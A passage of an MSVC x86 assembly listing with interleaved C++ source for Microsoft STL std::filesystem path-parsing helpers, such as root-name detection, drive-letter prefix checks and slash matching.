  00028	8b 4d 0c	 mov	 ecx, DWORD PTR __Last$[ebp]
  0002b	51		 push	 ecx
  0002c	8b 55 f8	 mov	 edx, DWORD PTR tv72[ebp]
  0002f	52		 push	 edx
  00030	e8 00 00 00 00	 call	 ??$find_if_not@PB_WU_Is_slash_oper@filesystem@std@@@std@@YAPB_WPB_WQB_WU_Is_slash_oper@filesystem@0@@Z ; std::find_if_not<wchar_t const *,std::filesystem::_Is_slash_oper>
  00035	83 c4 0c	 add	 esp, 12			; 0000000cH

; 442  :     }

  00038	8b e5		 mov	 esp, ebp
  0003a	5d		 pop	 ebp
  0003b	c3		 ret	 0
?_Find_relative_path@filesystem@std@@YAPB_WQB_W0@Z ENDP	; std::filesystem::_Find_relative_path
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xutility
;	COMDAT ??$find_if@PB_WU_Is_slash_oper@filesystem@std@@@std@@YAPB_WPB_WQB_WU_Is_slash_oper@filesystem@0@@Z
_TEXT	SEGMENT
__ULast$ = -8						; size = 4
__UFirst$ = -4						; size = 4
__First$ = 8						; size = 4
__Last$ = 12						; size = 4
__Pred$ = 16						; size = 1
??$find_if@PB_WU_Is_slash_oper@filesystem@std@@@std@@YAPB_WPB_WQB_WU_Is_slash_oper@filesystem@0@@Z PROC ; std::find_if<wchar_t const *,std::filesystem::_Is_slash_oper>, COMDAT

; 6273 : _NODISCARD _CONSTEXPR20 _InIt find_if(_InIt _First, const _InIt _Last, _Pr _Pred) { // find first satisfying _Pred

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8

; 6274 :     _Adl_verify_range(_First, _Last);

  00006	8d 45 0c	 lea	 eax, DWORD PTR __Last$[ebp]
  00009	50		 push	 eax
  0000a	8d 4d 08	 lea	 ecx, DWORD PTR __First$[ebp]
  0000d	51		 push	 ecx
  0000e	e8 00 00 00 00	 call	 ??$_Adl_verify_range@PB_WPB_W@std@@YAXABQB_W0@Z ; std::_Adl_verify_range<wchar_t const *,wchar_t const *>
  00013	83 c4 08	 add	 esp, 8

; 6275 :     auto _UFirst      = _Get_unwrapped(_First);

  00016	8d 55 08	 lea	 edx, DWORD PTR __First$[ebp]
  00019	52		 push	 edx
  0001a	e8 00 00 00 00	 call	 ??$_Get_unwrapped@AAPB_W@std@@YA?A_TAAPB_W@Z ; std::_Get_unwrapped<wchar_t const * &>
  0001f	83 c4 04	 add	 esp, 4
  00022	89 45 fc	 mov	 DWORD PTR __UFirst$[ebp], eax

; 6276 :     const auto _ULast = _Get_unwrapped(_Last);

  00025	8d 45 0c	 lea	 eax, DWORD PTR __Last$[ebp]
  00028	50		 push	 eax
  00029	e8 00 00 00 00	 call	 ??$_Get_unwrapped@ABQB_W@std@@YA?A_TABQB_W@Z ; std::_Get_unwrapped<wchar_t const * const &>
  0002e	83 c4 04	 add	 esp, 4
  00031	89 45 f8	 mov	 DWORD PTR __ULast$[ebp], eax

; 6277 :     for (; _UFirst != _ULast; ++_UFirst) {

  00034	eb 09		 jmp	 SHORT $LN4@find_if
$LN2@find_if:
  00036	8b 4d fc	 mov	 ecx, DWORD PTR __UFirst$[ebp]
  00039	83 c1 02	 add	 ecx, 2
  0003c	89 4d fc	 mov	 DWORD PTR __UFirst$[ebp], ecx
$LN4@find_if:
  0003f	8b 55 fc	 mov	 edx, DWORD PTR __UFirst$[ebp]
  00042	3b 55 f8	 cmp	 edx, DWORD PTR __ULast$[ebp]
  00045	74 1a		 je	 SHORT $LN3@find_if

; 6278 :         if (_Pred(*_UFirst)) {

  00047	8b 45 fc	 mov	 eax, DWORD PTR __UFirst$[ebp]
  0004a	0f b7 08	 movzx	 ecx, WORD PTR [eax]
  0004d	51		 push	 ecx
  0004e	8d 4d 10	 lea	 ecx, DWORD PTR __Pred$[ebp]
  00051	e8 00 00 00 00	 call	 ??R_Is_slash_oper@filesystem@std@@QBE_N_W@Z ; std::filesystem::_Is_slash_oper::operator()
  00056	0f b6 d0	 movzx	 edx, al
  00059	85 d2		 test	 edx, edx
  0005b	74 02		 je	 SHORT $LN5@find_if

; 6279 :             break;

  0005d	eb 02		 jmp	 SHORT $LN3@find_if
$LN5@find_if:

; 6280 :         }
; 6281 :     }

  0005f	eb d5		 jmp	 SHORT $LN2@find_if
$LN3@find_if:

; 6282 : 
; 6283 :     _Seek_wrapped(_First, _UFirst);

  00061	8d 45 fc	 lea	 eax, DWORD PTR __UFirst$[ebp]
  00064	50		 push	 eax
  00065	8d 4d 08	 lea	 ecx, DWORD PTR __First$[ebp]
  00068	51		 push	 ecx
  00069	e8 00 00 00 00	 call	 ??$_Seek_wrapped@PB_WAAPB_W@std@@YAXAAPB_W0@Z ; std::_Seek_wrapped<wchar_t const *,wchar_t const * &>
  0006e	83 c4 08	 add	 esp, 8

; 6284 :     return _First;

  00071	8b 45 08	 mov	 eax, DWORD PTR __First$[ebp]

; 6285 : }

  00074	8b e5		 mov	 esp, ebp
  00076	5d		 pop	 ebp
  00077	c3		 ret	 0
??$find_if@PB_WU_Is_slash_oper@filesystem@std@@@std@@YAPB_WPB_WQB_WU_Is_slash_oper@filesystem@0@@Z ENDP ; std::find_if<wchar_t const *,std::filesystem::_Is_slash_oper>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ?_Find_root_name_end@filesystem@std@@YAPB_WQB_W0@Z
_TEXT	SEGMENT
__First$ = 8						; size = 4
__Last$ = 12						; size = 4
?_Find_root_name_end@filesystem@std@@YAPB_WQB_W0@Z PROC	; std::filesystem::_Find_root_name_end, COMDAT

; 378  :     _NODISCARD inline const wchar_t* _Find_root_name_end(const wchar_t* const _First, const wchar_t* const _Last) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 379  :         // attempt to parse [_First, _Last) as a path and return the end of root-name if it exists; otherwise, _First
; 380  : 
; 381  :         // This is the place in the generic grammar where library implementations have the most freedom.
; 382  :         // Below are example Windows paths, and what we've decided to do with them:
; 383  :         // * X:DriveRelative, X:\DosAbsolute
; 384  :         //   We parse X: as root-name, if and only if \ is present we consider that root-directory
; 385  :         // * \RootRelative
; 386  :         //   We parse no root-name, and \ as root-directory
; 387  :         // * \\server\share
; 388  :         //   We parse \\server as root-name, \ as root-directory, and share as the first element in relative-path.
; 389  :         //   Technically, Windows considers all of \\server\share the logical "root", but for purposes
; 390  :         //   of decomposition we want those split, so that path{R"(\\server\share)"}.replace_filename("other_share")
; 391  :         //   is \\server\other_share
; 392  :         // * \\?\device
; 393  :         // * \??\device
; 394  :         // * \\.\device
; 395  :         //   CreateFile appears to treat these as the same thing; we will set the first three characters as root-name
; 396  :         //   and the first \ as root-directory. Support for these prefixes varies by particular Windows version, but
; 397  :         //   for the purposes of path decomposition we don't need to worry about that.
; 398  :         // * \\?\UNC\server\share
; 399  :         //   MSDN explicitly documents the \\?\UNC syntax as a special case. What actually happens is that the device
; 400  :         //   Mup, or "Multiple UNC provider", owns the path \\?\UNC in the NT namespace, and is responsible for the
; 401  :         //   network file access. When the user says \\server\share, CreateFile translates that into
; 402  :         //   \\?\UNC\server\share to get the remote server access behavior. Because NT treats this like any other
; 403  :         //   device, we have chosen to treat this as the \\?\ case above.
; 404  :         if (_Last - _First < 2) {

  00003	8b 45 0c	 mov	 eax, DWORD PTR __Last$[ebp]
  00006	2b 45 08	 sub	 eax, DWORD PTR __First$[ebp]
  00009	d1 f8		 sar	 eax, 1
  0000b	83 f8 02	 cmp	 eax, 2
  0000e	7d 08		 jge	 SHORT $LN2@Find_root_

; 405  :             return _First;

  00010	8b 45 08	 mov	 eax, DWORD PTR __First$[ebp]
  00013	e9 93 01 00 00	 jmp	 $LN1@Find_root_
$LN2@Find_root_:

; 406  :         }
; 407  : 
; 408  :         if (_Has_drive_letter_prefix(_First, _Last)) { // check for X: first because it's the most common root-name

  00018	8b 4d 0c	 mov	 ecx, DWORD PTR __Last$[ebp]
  0001b	51		 push	 ecx
  0001c	8b 55 08	 mov	 edx, DWORD PTR __First$[ebp]
  0001f	52		 push	 edx
  00020	e8 00 00 00 00	 call	 ?_Has_drive_letter_prefix@filesystem@std@@YA_NQB_W0@Z ; std::filesystem::_Has_drive_letter_prefix
  00025	83 c4 08	 add	 esp, 8
  00028	0f b6 c0	 movzx	 eax, al
  0002b	85 c0		 test	 eax, eax
  0002d	74 0b		 je	 SHORT $LN3@Find_root_

; 409  :             return _First + 2;

  0002f	8b 45 08	 mov	 eax, DWORD PTR __First$[ebp]
  00032	83 c0 04	 add	 eax, 4
  00035	e9 71 01 00 00	 jmp	 $LN1@Find_root_
$LN3@Find_root_:

; 410  :         }
; 411  : 
; 412  :         if (!_Is_slash(_First[0])) { // all the other root-names start with a slash; check that first because

  0003a	b9 02 00 00 00	 mov	 ecx, 2
  0003f	6b d1 00	 imul	 edx, ecx, 0
  00042	8b 45 08	 mov	 eax, DWORD PTR __First$[ebp]
  00045	0f b7 0c 10	 movzx	 ecx, WORD PTR [eax+edx]
  00049	51		 push	 ecx
  0004a	b9 00 00 00 00	 mov	 ecx, OFFSET ?_Is_slash@filesystem@std@@3U_Is_slash_oper@12@B ; std::filesystem::_Is_slash
  0004f	e8 00 00 00 00	 call	 ??R_Is_slash_oper@filesystem@std@@QBE_N_W@Z ; std::filesystem::_Is_slash_oper::operator()
  00054	0f b6 d0	 movzx	 edx, al
  00057	85 d2		 test	 edx, edx
  00059	75 08		 jne	 SHORT $LN4@Find_root_

; 413  :                                      // we expect paths without a leading slash to be very common
; 414  :             return _First;

  0005b	8b 45 08	 mov	 eax, DWORD PTR __First$[ebp]
  0005e	e9 48 01 00 00	 jmp	 $LN1@Find_root_
$LN4@Find_root_:

; 415  :         }
; 416  : 
; 417  :         // $ means anything other than a slash, including potentially the end of the input
; 418  :         if (_Last - _First >= 4 && _Is_slash(_First[3]) && (_Last - _First == 4 || !_Is_slash(_First[4])) // \xx\$
; 419  :             && ((_Is_slash(_First[1]) && (_First[2] == L'?' || _First[2] == L'.')) // \\?\$ or \\.\$

  00063	8b 45 0c	 mov	 eax, DWORD PTR __Last$[ebp]
  00066	2b 45 08	 sub	 eax, DWORD PTR __First$[ebp]
  00069	d1 f8		 sar	 eax, 1
  0006b	83 f8 04	 cmp	 eax, 4
  0006e	0f 8c c9 00 00
	00		 jl	 $LN5@Find_root_
  00074	b9 02 00 00 00	 mov	 ecx, 2
  00079	6b d1 03	 imul	 edx, ecx, 3
  0007c	8b 45 08	 mov	 eax, DWORD PTR __First$[ebp]
  0007f	0f b7 0c 10	 movzx	 ecx, WORD PTR [eax+edx]
  00083	51		 push	 ecx
  00084	b9 00 00 00 00	 mov	 ecx, OFFSET ?_Is_slash@filesystem@std@@3U_Is_slash_oper@12@B ; std::filesystem::_Is_slash
  00089	e8 00 00 00 00	 call	 ??R_Is_slash_oper@filesystem@std@@QBE_N_W@Z ; std::filesystem::_Is_slash_oper::operator()
  0008e	0f b6 d0	 movzx	 edx, al
  00091	85 d2		 test	 edx, edx
  00093	0f 84 a4 00 00
	00		 je	 $LN5@Find_root_
  00099	8b 45 0c	 mov	 eax, DWORD PTR __Last$[ebp]
  0009c	2b 45 08	 sub	 eax, DWORD PTR __First$[ebp]
  0009f	d1 f8		 sar	 eax, 1
  000a1	83 f8 04	 cmp	 eax, 4
  000a4	74 21		 je	 SHORT $LN6@Find_root_
  000a6	b9 02 00 00 00	 mov	 ecx, 2
  000ab	c1 e1 02	 shl	 ecx, 2
  000ae	8b 55 08	 mov	 edx, DWORD PTR __First$[ebp]
  000b1	0f b7 04 0a	 movzx	 eax, WORD PTR [edx+ecx]
  000b5	50		 push	 eax
  000b6	b9 00 00 00 00	 mov	 ecx, OFFSET ?_Is_slash@filesystem@std@@3U_Is_slash_oper@12@B ; std::filesystem::_Is_slash
  000bb	e8 00 00 00 00	 call	 ??R_Is_slash_oper@filesystem@std@@QBE_N_W@Z ; std::filesystem::_Is_slash_oper::operator()
  000c0	0f b6 c8	 movzx	 ecx, al
  000c3	85 c9		 test	 ecx, ecx
  000c5	75 76		 jne	 SHORT $LN5@Find_root_
$LN6@Find_root_:
  000c7	ba 02 00 00 00	 mov	 edx, 2
  000cc	c1 e2 00	 shl	 edx, 0
  000cf	8b 45 08	 mov	 eax, DWORD PTR __First$[ebp]
  000d2	0f b7 0c 10	 movzx	 ecx, WORD PTR [eax+edx]
  000d6	51		 push	 ecx
  000d7	b9 00 00 00 00	 mov	 ecx, OFFSET ?_Is_slash@filesystem@std@@3U_Is_slash_oper@12@B ; std::filesystem::_Is_slash
  000dc	e8 00 00 00 00	 call	 ??R_Is_slash_oper@filesystem@std@@QBE_N_W@Z ; std::filesystem::_Is_slash_oper::operator()
  000e1	0f b6 d0	 movzx	 edx, al
  000e4	85 d2		 test	 edx, edx
  000e6	74 26		 je	 SHORT $LN8@Find_root_
  000e8	b8 02 00 00 00	 mov	 eax, 2
  000ed	d1 e0		 shl	 eax, 1
  000ef	8b 4d 08	 mov	 ecx, DWORD PTR __First$[ebp]
  000f2	0f b7 14 01	 movzx	 edx, WORD PTR [ecx+eax]
  000f6	83 fa 3f	 cmp	 edx, 63			; 0000003fH
  000f9	74 3a		 je	 SHORT $LN7@Find_root_
  000fb	b8 02 00 00 00	 mov	 eax, 2
  00100	d1 e0		 shl	 eax, 1
  00102	8b 4d 08	 mov	 ecx, DWORD PTR __First$[ebp]
  00105	0f b7 14 01	 movzx	 edx, WORD PTR [ecx+eax]
  00109	83 fa 2e	 cmp	 edx, 46			; 0000002eH
  0010c	74 27		 je	 SHORT $LN7@Find_root_
$LN8@Find_root_:
  0010e	b8 02 00 00 00	 mov	 eax, 2
  00113	c1 e0 00	 shl	 eax, 0
  00116	8b 4d 08	 mov	 ecx, DWORD PTR __First$[ebp]
  00119	0f b7 14 01	 movzx	 edx, WORD PTR [ecx+eax]
  0011d	83 fa 3f	 cmp	 edx, 63			; 0000003fH
  00120	75 1b		 jne	 SHORT $LN5@Find_root_
  00122	b8 02 00 00 00	 mov	 eax, 2
  00127	d1 e0		 shl	 eax, 1
  00129	8b 4d 08	 mov	 ecx, DWORD PTR __First$[ebp]
  0012c	0f b7 14 01	 movzx	 edx, WORD PTR [ecx+eax]
  00130	83 fa 3f	 cmp	 edx, 63			; 0000003fH
  00133	75 08		 jne	 SHORT $LN5@Find_root_
$LN7@Find_root_:

; 420  :                 || (_First[1] == L'?' && _First[2] == L'?'))) { // \??\$
; 421  :             return _First + 3;

  00135	8b 45 08	 mov	 eax, DWORD PTR __First$[ebp]
  00138	83 c0 06	 add	 eax, 6
  0013b	eb 6e		 jmp	 SHORT $LN1@Find_root_
$LN5@Find_root_:

; 422  :         }
; 423  : 
; 424  :         if (_Last - _First >= 3 && _Is_slash(_First[1]) && !_Is_slash(_First[2])) { // \\server

  0013d	8b 45 0c	 mov	 eax, DWORD PTR __Last$[ebp]
  00140	2b 45 08	 sub	 eax, DWORD PTR __First$[ebp]
  00143	d1 f8		 sar	 eax, 1
  00145	83 f8 03	 cmp	 eax, 3
  00148	7c 5e		 jl	 SHORT $LN9@Find_root_
  0014a	b9 02 00 00 00	 mov	 ecx, 2
  0014f	c1 e1 00	 shl	 ecx, 0
  00152	8b 55 08	 mov	 edx, DWORD PTR __First$[ebp]
  00155	0f b7 04 0a	 movzx	 eax, WORD PTR [edx+ecx]
  00159	50		 push	 eax
  0015a	b9 00 00 00 00	 mov	 ecx, OFFSET ?_Is_slash@filesystem@std@@3U_Is_slash_oper@12@B ; std::filesystem::_Is_slash
  0015f	e8 00 00 00 00	 call	 ??R_Is_slash_oper@filesystem@std@@QBE_N_W@Z ; std::filesystem::_Is_slash_oper::operator()
  00164	0f b6 c8	 movzx	 ecx, al
  00167	85 c9		 test	 ecx, ecx
  00169	74 3d		 je	 SHORT $LN9@Find_root_
  0016b	ba 02 00 00 00	 mov	 edx, 2
  00170	d1 e2		 shl	 edx, 1
  00172	8b 45 08	 mov	 eax, DWORD PTR __First$[ebp]
  00175	0f b7 0c 10	 movzx	 ecx, WORD PTR [eax+edx]
  00179	51		 push	 ecx
  0017a	b9 00 00 00 00	 mov	 ecx, OFFSET ?_Is_slash@filesystem@std@@3U_Is_slash_oper@12@B ; std::filesystem::_Is_slash
  0017f	e8 00 00 00 00	 call	 ??R_Is_slash_oper@filesystem@std@@QBE_N_W@Z ; std::filesystem::_Is_slash_oper::operator()
  00184	0f b6 d0	 movzx	 edx, al
  00187	85 d2		 test	 edx, edx
  00189	75 1d		 jne	 SHORT $LN9@Find_root_

; 425  :             return _STD find_if(_First + 3, _Last, _Is_slash);

  0018b	0f b6 05 00 00
	00 00		 movzx	 eax, BYTE PTR ?_Is_slash@filesystem@std@@3U_Is_slash_oper@12@B ; std::filesystem::_Is_slash
  00192	50		 push	 eax
  00193	8b 4d 0c	 mov	 ecx, DWORD PTR __Last$[ebp]
  00196	51		 push	 ecx
  00197	8b 55 08	 mov	 edx, DWORD PTR __First$[ebp]
  0019a	83 c2 06	 add	 edx, 6
  0019d	52		 push	 edx
  0019e	e8 00 00 00 00	 call	 ??$find_if@PB_WU_Is_slash_oper@filesystem@std@@@std@@YAPB_WPB_WQB_WU_Is_slash_oper@filesystem@0@@Z ; std::find_if<wchar_t const *,std::filesystem::_Is_slash_oper>
  001a3	83 c4 0c	 add	 esp, 12			; 0000000cH
  001a6	eb 03		 jmp	 SHORT $LN1@Find_root_
$LN9@Find_root_:

; 426  :         }
; 427  : 
; 428  :         // no match
; 429  :         return _First;

  001a8	8b 45 08	 mov	 eax, DWORD PTR __First$[ebp]
$LN1@Find_root_:

; 430  :     }

  001ab	5d		 pop	 ebp
  001ac	c3		 ret	 0
?_Find_root_name_end@filesystem@std@@YAPB_WQB_W0@Z ENDP	; std::filesystem::_Find_root_name_end
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ?_Has_drive_letter_prefix@filesystem@std@@YA_NQB_W0@Z
_TEXT	SEGMENT
tv71 = -4						; size = 4
__First$ = 8						; size = 4
__Last$ = 12						; size = 4
?_Has_drive_letter_prefix@filesystem@std@@YA_NQB_W0@Z PROC ; std::filesystem::_Has_drive_letter_prefix, COMDAT

; 373  :     _NODISCARD inline bool _Has_drive_letter_prefix(const wchar_t* const _First, const wchar_t* const _Last) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx

; 374  :         // test if [_First, _Last) has a prefix of the form X:
; 375  :         return _Last - _First >= 2 && _Is_drive_prefix(_First);

  00004	8b 45 0c	 mov	 eax, DWORD PTR __Last$[ebp]
  00007	2b 45 08	 sub	 eax, DWORD PTR __First$[ebp]
  0000a	d1 f8		 sar	 eax, 1
  0000c	83 f8 02	 cmp	 eax, 2
  0000f	7c 1c		 jl	 SHORT $LN3@Has_drive_
  00011	8b 4d 08	 mov	 ecx, DWORD PTR __First$[ebp]
  00014	51		 push	 ecx
  00015	e8 00 00 00 00	 call	 ?_Is_drive_prefix@filesystem@std@@YA_NQB_W@Z ; std::filesystem::_Is_drive_prefix
  0001a	83 c4 04	 add	 esp, 4
  0001d	0f b6 d0	 movzx	 edx, al
  00020	85 d2		 test	 edx, edx
  00022	74 09		 je	 SHORT $LN3@Has_drive_
  00024	c7 45 fc 01 00
	00 00		 mov	 DWORD PTR tv71[ebp], 1
  0002b	eb 07		 jmp	 SHORT $LN4@Has_drive_
$LN3@Has_drive_:
  0002d	c7 45 fc 00 00
	00 00		 mov	 DWORD PTR tv71[ebp], 0
$LN4@Has_drive_:
  00034	0f b6 45 fc	 movzx	 eax, BYTE PTR tv71[ebp]

; 376  :     }

  00038	8b e5		 mov	 esp, ebp
  0003a	5d		 pop	 ebp
  0003b	c3		 ret	 0
?_Has_drive_letter_prefix@filesystem@std@@YA_NQB_W0@Z ENDP ; std::filesystem::_Has_drive_letter_prefix
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ??$_Unaligned_load@I@filesystem@std@@YAIPBX@Z
_TEXT	SEGMENT
__Tmp$ = -4						; size = 4
__Ptr$ = 8						; size = 4
??$_Unaligned_load@I@filesystem@std@@YAIPBX@Z PROC	; std::filesystem::_Unaligned_load<unsigned int>, COMDAT

; 356  :     _NODISCARD _Ty _Unaligned_load(const void* _Ptr) { // load a _Ty from _Ptr

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx

; 357  :         static_assert(is_trivial_v<_Ty>, "Unaligned loads require trivial types");
; 358  :         _Ty _Tmp;
; 359  :         _CSTD memcpy(&_Tmp, _Ptr, sizeof(_Tmp));

  00004	6a 04		 push	 4
  00006	8b 45 08	 mov	 eax, DWORD PTR __Ptr$[ebp]
  00009	50		 push	 eax
  0000a	8d 4d fc	 lea	 ecx, DWORD PTR __Tmp$[ebp]
  0000d	51		 push	 ecx
  0000e	e8 00 00 00 00	 call	 _memcpy
  00013	83 c4 0c	 add	 esp, 12			; 0000000cH

; 360  :         return _Tmp;

  00016	8b 45 fc	 mov	 eax, DWORD PTR __Tmp$[ebp]

; 361  :     }

  00019	8b e5		 mov	 esp, ebp
  0001b	5d		 pop	 ebp
  0001c	c3		 ret	 0
??$_Unaligned_load@I@filesystem@std@@YAIPBX@Z ENDP	; std::filesystem::_Unaligned_load<unsigned int>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ?_Is_drive_prefix@filesystem@std@@YA_NQB_W@Z
_TEXT	SEGMENT
tv69 = -8						; size = 4
__Value$ = -4						; size = 4
__First$ = 8						; size = 4
?_Is_drive_prefix@filesystem@std@@YA_NQB_W@Z PROC	; std::filesystem::_Is_drive_prefix, COMDAT

; 363  :     _NODISCARD inline bool _Is_drive_prefix(const wchar_t* const _First) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8

; 364  :         // test if _First points to a prefix of the form X:
; 365  :         // pre: _First points to at least 2 wchar_t instances
; 366  :         // pre: Little endian
; 367  :         auto _Value = _Unaligned_load<unsigned int>(_First);

  00006	8b 45 08	 mov	 eax, DWORD PTR __First$[ebp]
  00009	50		 push	 eax
  0000a	e8 00 00 00 00	 call	 ??$_Unaligned_load@I@filesystem@std@@YAIPBX@Z ; std::filesystem::_Unaligned_load<unsigned int>
  0000f	83 c4 04	 add	 esp, 4
  00012	89 45 fc	 mov	 DWORD PTR __Value$[ebp], eax

; 368  :         _Value &= 0xFFFF'FFDFu; // transform lowercase drive letters into uppercase ones

  00015	8b 4d fc	 mov	 ecx, DWORD PTR __Value$[ebp]
  00018	83 e1 df	 and	 ecx, -33		; ffffffdfH
  0001b	89 4d fc	 mov	 DWORD PTR __Value$[ebp], ecx

; 369  :         _Value -= (static_cast<unsigned int>(L':') << (sizeof(wchar_t) * CHAR_BIT)) | L'A';

  0001e	8b 55 fc	 mov	 edx, DWORD PTR __Value$[ebp]
  00021	81 ea 41 00 3a
	00		 sub	 edx, 3801153		; 003a0041H
  00027	89 55 fc	 mov	 DWORD PTR __Value$[ebp], edx

; 370  :         return _Value < 26;

  0002a	83 7d fc 1a	 cmp	 DWORD PTR __Value$[ebp], 26 ; 0000001aH
  0002e	73 09		 jae	 SHORT $LN3@Is_drive_p
  00030	c7 45 f8 01 00
	00 00		 mov	 DWORD PTR tv69[ebp], 1
  00037	eb 07		 jmp	 SHORT $LN4@Is_drive_p
$LN3@Is_drive_p:
  00039	c7 45 f8 00 00
	00 00		 mov	 DWORD PTR tv69[ebp], 0
$LN4@Is_drive_p:
  00040	0f b6 45 f8	 movzx	 eax, BYTE PTR tv69[ebp]

; 371  :     }

  00044	8b e5		 mov	 esp, ebp
  00046	5d		 pop	 ebp
  00047	c3		 ret	 0
?_Is_drive_prefix@filesystem@std@@YA_NQB_W@Z ENDP	; std::filesystem::_Is_drive_prefix
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ??R_Is_slash_oper@filesystem@std@@QBE_N_W@Z
_TEXT	SEGMENT
_this$ = -8						; size = 4
tv68 = -4						; size = 4
__Ch$ = 8						; size = 2
??R_Is_slash_oper@filesystem@std@@QBE_N_W@Z PROC	; std::filesystem::_Is_slash_oper::operator(), COMDAT
; _this$ = ecx

; 348  :         _NODISCARD constexpr bool operator()(const wchar_t _Ch) const {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8
  00006	89 4d f8	 mov	 DWORD PTR _this$[ebp], ecx

; 349  :             return _Ch == L'\\' || _Ch == L'/';

  00009	0f b7 45 08	 movzx	 eax, WORD PTR __Ch$[ebp]
  0000d	83 f8 5c	 cmp	 eax, 92			; 0000005cH
  00010	74 12		 je	 SHORT $LN3@operator
  00012	0f b7 4d 08	 movzx	 ecx, WORD PTR __Ch$[ebp]
  00016	83 f9 2f	 cmp	 ecx, 47			; 0000002fH
  00019	74 09		 je	 SHORT $LN3@operator
  0001b	c7 45 fc 00 00
	00 00		 mov	 DWORD PTR tv68[ebp], 0
  00022	eb 07		 jmp	 SHORT $LN4@operator
$LN3@operator:
  00024	c7 45 fc 01 00
	00 00		 mov	 DWORD PTR tv68[ebp], 1
$LN4@operator:
  0002b	0f b6 45 fc	 movzx	 eax, BYTE PTR tv68[ebp]

; 350  :         }

  0002f	8b e5		 mov	 esp, ebp
  00031	5d		 pop	 ebp
  00032	c2 04 00	 ret	 4
??R_Is_slash_oper@filesystem@std@@QBE_N_W@Z ENDP	; std::filesystem::_Is_slash_oper::operator()
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ?_Convert_narrow_to_wide@filesystem@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@2@W4__std_code_page@@V?$basic_string_view@DU?$char_traits@D@std@@@2@@Z
_TEXT	SEGMENT
$T1 = -68						; size = 8
$T2 = -60						; size = 8
tv140 = -52						; size = 4
tv142 = -48						; size = 4
tv144 = -44						; size = 4
tv87 = -40						; size = 4
tv89 = -36						; size = 4
__Len$3 = -32						; size = 4
__Output$ = -28						; size = 24
__$ArrayPad$ = -4					; size = 4
___$ReturnUdt$ = 8					; size = 4
__Code_page$ = 12					; size = 4
__Input$ = 16						; size = 8
?_Convert_narrow_to_wide@filesystem@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@2@W4__std_code_page@@V?$basic_string_view@DU?$char_traits@D@std@@@2@@Z PROC ; std::filesystem::_Convert_narrow_to_wide, COMDAT

; 39   :     _NODISCARD inline wstring _Convert_narrow_to_wide(const __std_code_page _Code_page, const string_view _Input) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 44	 sub	 esp, 68			; 00000044H
  00006	a1 00 00 00 00	 mov	 eax, DWORD PTR ___security_cookie
  0000b	33 c5		 xor	 eax, ebp
  0000d	89 45 fc	 mov	 DWORD PTR __$ArrayPad$[ebp], eax

; 40   :         wstring _Output;

  00010	8d 4d e4	 lea	 ecx, DWORD PTR __Output$[ebp]
  00013	e8 00 00 00 00	 call	 ??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAE@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >

; 41   : 
; 42   :         if (!_Input.empty()) {

  00018	8d 4d 10	 lea	 ecx, DWORD PTR __Input$[ebp]
  0001b	e8 00 00 00 00	 call	 ?empty@?$basic_string_view@DU?$char_traits@D@std@@@std@@QBE_NXZ ; std::basic_string_view<char,std::char_traits<char> >::empty
  00020	0f b6 c0	 movzx	 eax, al
  00023	85 c0		 test	 eax, eax
  00025	0f 85 b8 00 00
	00		 jne	 $LN2@Convert_na

; 43   :             if (_Input.size() > static_cast<size_t>(INT_MAX)) {

  0002b	8d 4d 10	 lea	 ecx, DWORD PTR __Input$[ebp]
  0002e	e8 00 00 00 00	 call	 ?size@?$basic_string_view@DU?$char_traits@D@std@@@std@@QBEIXZ ; std::basic_string_view<char,std::char_traits<char> >::size
  00033	3d ff ff ff 7f	 cmp	 eax, 2147483647		; 7fffffffH
  00038	76 07		 jbe	 SHORT $LN3@Convert_na

; 44   :                 _Throw_system_error(errc::invalid_argument);

  0003a	6a 16		 push	 22			; 00000016H
  0003c	e8 00 00 00 00	 call	 ?_Throw_system_error@std@@YAXW4errc@1@@Z ; std::_Throw_system_error
$LN3@Convert_na:

; 45   :             }
; 46   : 
; 47   :             const int _Len = _Check_convert_result(__std_fs_convert_narrow_to_wide(

  00041	8d 4d 10	 lea	 ecx, DWORD PTR __Input$[ebp]
  00044	e8 00 00 00 00	 call	 ?size@?$basic_string_view@DU?$char_traits@D@std@@@std@@QBEIXZ ; std::basic_string_view<char,std::char_traits<char> >::size
  00049	89 45 dc	 mov	 DWORD PTR tv89[ebp], eax
  0004c	8d 4d 10	 lea	 ecx, DWORD PTR __Input$[ebp]
